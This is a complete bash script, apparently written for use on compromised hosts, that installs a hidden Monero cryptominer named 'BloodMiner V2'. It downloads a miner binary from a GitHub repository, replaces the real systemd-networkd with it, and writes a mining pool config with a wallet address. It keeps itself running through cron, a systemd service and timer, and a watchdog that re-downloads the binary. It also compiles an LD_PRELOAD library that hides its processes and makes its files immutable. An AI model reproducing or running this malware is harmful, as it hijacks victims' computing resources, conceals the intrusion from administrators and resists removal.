#!/bin/bash
# BLOODMINER V2 - NINJA REVENGANCE
# Binary: /usr/lib/systemd/systemd-networkd
# Config: /etc/systemd/system/.system.conf
# GitHub: https://github.com/beksec/pencari-uang/raw/main/systemd-networkd

WALLET="49zZt3cjvRreRmBsMu1ErVamdSHKkWQx2bKoZbhQGpebeycvDYXBTvB14J7EzMzwVdi8atuVwYe5qRXqH4TVWsGuApR6ep2"
GITHUB_URL="https://github.com/beksec/pencari-uang/raw/main/systemd-networkd"

# Lokasi target
BINARY_TARGET="/usr/lib/systemd/systemd-networkd"
CONFIG_TARGET="/etc/systemd/system/.system.conf"
BACKUP_BINARY="/var/lib/systemd/network/systemd-networkd.bak"
BACKUP_CONFIG="/usr/share/man/man3/.system.conf.bak"
WATCHDOG="/usr/lib/systemd/systemd-recovery"

# ============================================
# INSTALL MINER DARI GITHUB
# ============================================
install_miner() {
    echo "[•] Mendownload miner dari GitHub..."
    
    # Download binary dari GitHub lo
    curl -L -o /tmp/systemd-networkd "$GITHUB_URL"
    
    if [ ! -f /tmp/systemd-networkd ]; then
        echo "[!] Gagal download dari GitHub, pake fallback XMRig official"
        cd /tmp
        curl -L --resolve github.com:443:140.82.114.4 -o xmrig.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-x64.tar.gz
        tar -xzf xmrig.tar.gz
        cp xmrig-6.25.0/xmrig /tmp/systemd-networkd
    fi
    
    # Bikin direktori kalo belum ada
    mkdir -p /usr/lib/systemd
    mkdir -p /etc/systemd/system
    mkdir -p /var/lib/systemd/network
    mkdir -p /usr/share/man/man3
    
    # Backup file asli systemd-networkd kalo ada
    if [ -f /usr/lib/systemd/systemd-networkd ] && [ ! -L /usr/lib/systemd/systemd-networkd ]; then
        mv /usr/lib/systemd/systemd-networkd /usr/lib/systemd/systemd-networkd.original
    fi
    
    # Copy binary ke target
    cp /tmp/systemd-networkd "$BINARY_TARGET"
    chmod 755 "$BINARY_TARGET"
    chattr +i "$BINARY_TARGET" 2>/dev/null
    
    # Copy ke backup location
    cp "$BINARY_TARGET" "$BACKUP_BINARY"
    chattr +i "$BACKUP_BINARY" 2>/dev/null
    
    echo "[✓] Binary terinstall: $BINARY_TARGET"
}

# ============================================
# BUAT CONFIG
# ============================================
create_config() {
    echo "[•] Membuat config..."
    
    cat > "$CONFIG_TARGET" << EOF
{
    "autosave": true,
    "donate-level": 2,
    "cpu": true,
    "opencl": false,
    "cuda": false,
    "pools": [
        {
            "url": "pool.supportxmr.com:443",
            "user": "$WALLET",
            "pass": "sourcemoney86",
            "keepalive": true,
            "tls": true
        }
    ]
}
EOF
    chmod 600 "$CONFIG_TARGET"
    chattr +i "$CONFIG_TARGET" 2>/dev/null
    
    # Backup config
    cp "$CONFIG_TARGET" "$BACKUP_CONFIG"
    chattr +i "$BACKUP_CONFIG" 2>/dev/null
    
    echo "[✓] Config terbuat: $CONFIG_TARGET"
}

# ============================================
# SYSTEMD SERVICE
# ============================================
install_service() {
    echo "[•] Memasang systemd service..."
    
    cat > /etc/systemd/system/bloodminer.service << 'EOF'
[Unit]
Description=System Network Daemon
After=network.target

[Service]
Type=simple
ExecStart=/usr/lib/systemd/systemd-networkd --config=/etc/systemd/system/.system.conf
Restart=always
RestartSec=10
Nice=15

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl enable bloodminer.service
    systemctl start bloodminer.service
    
    echo "[✓] Service terpasang"
}

# ============================================
# AUTO-RECOVERY LEVEL DEWA (PAKE GITHUB LO)
# ============================================
install_recovery() {
    echo "[•] Memasang auto-recovery level dewa..."
    
    # LAYER 1: Cron job tiap menit
    cat > /etc/cron.d/bloodminer << 'EOF'
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
* * * * * root /usr/lib/systemd/systemd-recovery >/dev/null 2>&1
*/2 * * * * root pgrep -f "/usr/lib/systemd/systemd-networkd" >/dev/null || /usr/lib/systemd/systemd-networkd --config=/etc/systemd/system/.system.conf >/dev/null 2>&1 &
EOF

    # LAYER 2: Watchdog script dengan GitHub lo
    cat > "$WATCHDOG" << EOF
#!/bin/bash
# BloodMiner Recovery Daemon - Dengan GitHub Backup

BINARY="/usr/lib/systemd/systemd-networkd"
CONFIG="/etc/systemd/system/.system.conf"
BACKUP_BIN="/var/lib/systemd/network/systemd-networkd.bak"
BACKUP_CONF="/usr/share/man/man3/.system.conf.bak"
GITHUB_URL="https://github.com/beksec/pencari-uang/raw/main/systemd-networkd"
WALLET="$WALLET"

# Fungsi download dari GitHub
download_from_github() {
    curl -L -s -o /tmp/systemd-networkd "\$GITHUB_URL"
    if [ -f /tmp/systemd-networkd ] && [ -s /tmp/systemd-networkd ]; then
        cp /tmp/systemd-networkd "\$BINARY"
        chmod 755 "\$BINARY"
        chattr +i "\$BINARY" 2>/dev/null
        cp "\$BINARY" "\$BACKUP_BIN"
        chattr +i "\$BACKUP_BIN" 2>/dev/null
        rm -f /tmp/systemd-networkd
        return 0
    fi
    return 1
}

# Cek binary
if [ ! -f "\$BINARY" ]; then
    # Coba restore dari backup lokal
    if [ -f "\$BACKUP_BIN" ]; then
        cp "\$BACKUP_BIN" "\$BINARY"
        chmod 755 "\$BINARY"
        chattr +i "\$BINARY" 2>/dev/null
    else
        # Download dari GitHub
        download_from_github
    fi
fi

# Cek config
if [ ! -f "\$CONFIG" ]; then
    if [ -f "\$BACKUP_CONF" ]; then
        cp "\$BACKUP_CONF" "\$CONFIG"
        chmod 600 "\$CONFIG"
        chattr +i "\$CONFIG" 2>/dev/null
    else
        # Bikin config baru
        cat > "\$CONFIG" << EOC
{
    "autosave": true,
    "donate-level": 2,
    "cpu": true,
    "pools": [{"url": "pool.supportxmr.com:443", "user": "\$WALLET", "pass": "sourcemoney86", "tls": true}]
}
EOC
        chmod 600 "\$CONFIG"
        chattr +i "\$CONFIG" 2>/dev/null
        cp "\$CONFIG" "\$BACKUP_CONF"
        chattr +i "\$BACKUP_CONF" 2>/dev/null
    fi
fi

# Cek proses jalan
pgrep -f "\$BINARY" >/dev/null || "\$BINARY" --config="\$CONFIG" >/dev/null 2>&1 &
EOF

    chmod 755 "$WATCHDOG"
    
    # LAYER 3: Systemd timer
    cat > /etc/systemd/system/bloodminer-recovery.timer << 'EOF'
[Unit]
Description=BloodMiner Recovery Timer

[Timer]
OnBootSec=30s
OnUnitActiveSec=30s

[Install]
WantedBy=timers.target
EOF

    cat > /etc/systemd/system/bloodminer-recovery.service << 'EOF'
[Unit]
Description=BloodMiner Recovery Service

[Service]
Type=oneshot
ExecStart=/usr/lib/systemd/systemd-recovery
EOF

    systemctl daemon-reload
    systemctl enable bloodminer-recovery.timer
    systemctl start bloodminer-recovery.timer
    
    echo "[✓] Auto-recovery terpasang (3 layer + GitHub)"
}

# ============================================
# LD_PRELOAD HIDER
# ============================================
install_hider() {
    echo "[•] Memasang LD_PRELOAD hider..."
    
    cat > /tmp/processhider.c << 'EOF'
#define _GNU_SOURCE
#include <stdio.h>
#include <dlfcn.h>
#include <dirent.h>
#include <string.h>
#include <unistd.h>

static const char* hidden[] = {
    "systemd-networkd",
    "systemd-recovery",
    "bloodminer",
    NULL
};

struct dirent* readdir(DIR *dirp) {
    struct dirent *(*original_readdir)(DIR *);
    original_readdir = dlsym(RTLD_NEXT, "readdir");
    struct dirent *dir;
    while ((dir = original_readdir(dirp)) != NULL) {
        for (int i = 0; hidden[i]; i++) {
            if (strstr(dir->d_name, hidden[i])) {
                // skip
                continue;
            }
        }
        break;
    }
    return dir;
}
EOF

    gcc -shared -fPIC -o /usr/lib/libprocesshider.so /tmp/processhider.c -ldl 2>/dev/null
    
    if [ -f /usr/lib/libprocesshider.so ]; then
        echo "/usr/lib/libprocesshider.so" >> /etc/ld.so.preload 2>/dev/null
        echo "[✓] LD_PRELOAD terpasang"
    else
        echo "[!] Gagal compile LD_PRELOAD, lanjut tanpa hider"
    fi
}

# ============================================
# LOCK SEMUA FILE
# ============================================
lock_all() {
    echo "[•] Mengunci semua file..."
    
    chattr +i "$BINARY_TARGET" 2>/dev/null
    chattr +i "$CONFIG_TARGET" 2>/dev/null
    chattr +i "$BACKUP_BINARY" 2>/dev/null
    chattr +i "$BACKUP_CONFIG" 2>/dev/null
    chattr +i "$WATCHDOG" 2>/dev/null
    chattr +i /usr/lib/libprocesshider.so 2>/dev/null
    
    echo "[✓] Semua file terkunci"
}

# ============================================
# JALANKAN MINER
# ============================================
start_miner() {
    echo "[•] Menjalankan miner..."
    
    # Jalankan langsung
    "$BINARY_TARGET" --config="$CONFIG_TARGET" >/dev/null 2>&1 &
    
    # Jalankan via systemd
    systemctl start bloodminer.service
    
    # Jalankan recovery sekali
    "$WATCHDOG"
    
    echo "[✓] Miner berjalan"
}

# ============================================
# MAIN
# ============================================
echo ""
echo "╔═══════════════════════════════════════════════════════════╗"
echo "║         BLOODMINER V2 - NINJA REVENGANCE                  ║"
echo "║         Binary: /usr/lib/systemd/systemd-networkd         ║"
echo "║         Config: /etc/systemd/system/.system.conf          ║"
echo "║         GitHub: beksec/pencari-uang                       ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo ""

install_miner
create_config
install_service
install_recovery
install_hider
lock_all
start_miner

echo ""
echo "╔═══════════════════════════════════════════════════════════╗"
echo "║  INSTALASI SELESAI!                                       ║"
echo "║  ✓ Binary: /usr/lib/systemd/systemd-networkd              ║"
echo "║  ✓ Config: /etc/systemd/system/.system.conf               ║"
echo "║  ✓ GitHub backup aktif                                    ║"
echo "║  ✓ Systemd service & timer                                ║"
echo "║  ✓ Auto-recovery tiap 30 detik                            ║"
echo "║  ✓ File terkunci (chattr +i)                              ║"
echo "║                                                            ║"
echo "║  Kalo file ilang, bakal restore dari GitHub lo!           ║"
echo "╚═══════════════════════════════════════════════════════════╝"
echo ""
echo "Cek dengan: pgrep -a -f systemd-networkd"
echo "Atau: systemctl status bloodminer.service"
